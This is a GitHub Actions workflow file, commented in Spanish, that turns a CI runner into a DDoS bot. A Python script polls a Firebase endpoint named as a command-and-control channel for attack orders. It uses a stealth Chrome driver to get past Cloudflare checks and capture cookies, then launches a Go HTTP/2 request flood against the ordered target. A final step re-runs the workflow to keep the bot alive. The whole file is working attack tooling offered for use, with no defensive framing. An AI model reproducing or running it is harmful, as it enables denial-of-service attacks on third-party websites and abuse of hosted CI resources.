name: Ryxen-Omega-Final
on:
  workflow_dispatch:

jobs:
  phantom-power:
    runs-on: ubuntu-latest
    steps:
    - name: Global Environment Setup
      run: |
        sudo apt-get update
        sudo apt-get install -y golang-go google-chrome-stable xvfb
        pip install requests undetected-chromedriver selenium numpy

    - name: Create Engine (engine.py)
      run: |
        cat <<EOF > engine.py
        import requests, time, subprocess, random, numpy as np
        import undetected_chromedriver as uc

        FB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
        LAST_TS = 0

        def get_stealth_session(url):
            print("ðŸ§  [SELENIUM] Saltando Cloudflare y obteniendo sesiÃ³n...")
            opts = uc.ChromeOptions()
            opts.add_argument('--headless')
            opts.add_argument('--no-sandbox')
            try:
                driver = uc.Chrome(options=opts)
                driver.get(url)
                time.sleep(20) # MÃ¡s tiempo para el bypass
                cookie = "; ".join([f"{c['name']}={c['value']}" for c in driver.get_cookies()])
                ua = driver.execute_script("return navigator.userAgent")
                driver.quit()
                return cookie, ua
            except: return None, None

        if __name__ == "__main__":
            while True:
                try:
                    res = requests.get(FB_URL).json()
                    ts = res.get("timestamp", 0)
                    if res and res.get("status") == "attack" and ts > LAST_TS:
                        target = res.get("target")
                        duration = res.get("time", 90)
                        method = res.get("method", "dstat-fast")
                        threads = res.get("threads", 100)
                        LAST_TS = ts
                        
                        cookie, ua = get_stealth_session(target)
                        if cookie:
                            print(f"ðŸ”¥ [EXE] Lanzando {method} contra {target}")
                            subprocess.run(["go", "run", "attack.go", target, str(duration), cookie, ua, str(threads), method])
                        requests.patch(FB_URL, json={"status": "idle"})
                    else:
                        np.random.rand(800, 800) @ np.random.rand(800, 800)
                        time.sleep(25)
                except: pass
        EOF

    - name: Create Advanced Go Striker (attack.go)
      run: |
        cat <<EOF > attack.go
        package main
        import ("net/http"; "os"; "strconv"; "sync"; "time"; "crypto/tls"; "golang.org/x/net/http2")

        func main() {
            target, durStr, cookie, ua := os.Args[1], os.Args[2], os.Args[3], os.Args[4]
            threads, _ := strconv.Atoi(os.Args[5])
            duration, _ := strconv.Atoi(durStr)
            method := os.Args[6]

            var wg sync.WaitGroup
            stop := time.After(time.Duration(duration) * time.Second)

            // Transporte HTTP/2 para masividad
            tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            }
            http2.ConfigureTransport(tr)
            client := &http.Client{Transport: tr, Timeout: 4 * time.Second}

            for i := 0; i < threads; i++ {
                wg.Add(1)
                go func() {
                    defer wg.Done()
                    for {
                        select {
                        case <-stop: return
                        default:
                            req, _ := http.NewRequest("GET", target, nil)
                            req.Header.Set("Cookie", cookie)
                            req.Header.Set("User-Agent", ua)
                            req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                            
                            if method == "dstat-fast" {
                                req.Header.Set("Cache-Control", "no-cache")
                                req.Header.Set("Connection", "keep-alive")
                            }

                            resp, err := client.Do(req)
                            if err == nil { resp.Body.Close() }
                        }
                    }
                }()
            }
            wg.Wait()
        }
        EOF

    - name: Persistence
      env:
        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      run: |
        python engine.py &
        sleep 18000
        gh workflow run main.yml

